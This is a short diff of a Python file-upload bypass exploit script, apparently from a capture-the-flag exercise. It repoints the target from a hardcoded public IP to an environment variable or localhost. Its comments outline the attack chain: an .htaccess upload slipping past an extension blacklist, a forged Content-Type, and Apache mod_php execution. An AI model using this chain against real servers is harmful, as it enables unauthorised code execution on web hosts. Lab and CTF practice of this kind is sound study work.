@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 # 40-combo-upload-bypass
 # 利用链: 黑名单不全(.htaccess漏网) + MIME仅看Content-Type + Apache AllowOverride + mod_php
@@ -7,7 +8,7 @@ atexit.register(lambda: print("作者 ZluxYao"))
 import sys
 import requests
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://47.120.76.57:34967"
+TARGET = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34967")
 
 def upload(filename: str, content: bytes, mime: str = "image/jpeg") -> str:
     """以 multipart/form-data 上传，filename 字段由我们指定（伪造 MIME 绕白名单）"""
